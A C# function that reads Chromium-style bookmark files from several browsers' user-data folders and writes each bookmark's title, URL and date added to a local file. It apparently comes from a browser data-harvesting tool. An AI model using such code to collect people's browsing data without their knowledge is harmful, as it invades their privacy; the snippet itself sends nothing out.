// bookmarks
public static void SAVE(string filename)
{
    int counter = 0;

    using (StreamWriter sw = new StreamWriter(filename))
    {
        foreach (string browser in Paths.Browser)
        {
            string Browser = Paths.GetUserData(browser) + "Bookmarks";
            if (File.Exists(Browser))
            {
                string bookmarksFile = File.ReadAllText(Browser);
                foreach (SimpleJSON.JSONNode mark in SimpleJSON.JSON.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
                {                            
                    try
                    {
                        sw.WriteLine($"Title: {mark["name"]} | Host: {mark["url"]} | AddedOn: {Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64((string)mark["date_added"])), TimeZoneInfo.Local))}");
                        counter++;
                    }
                    catch { }

                    continue;
                }                        
            }
        }
    }

    Console.WriteLine($"Found {counter} bookmarks data and saved in {filename}");
}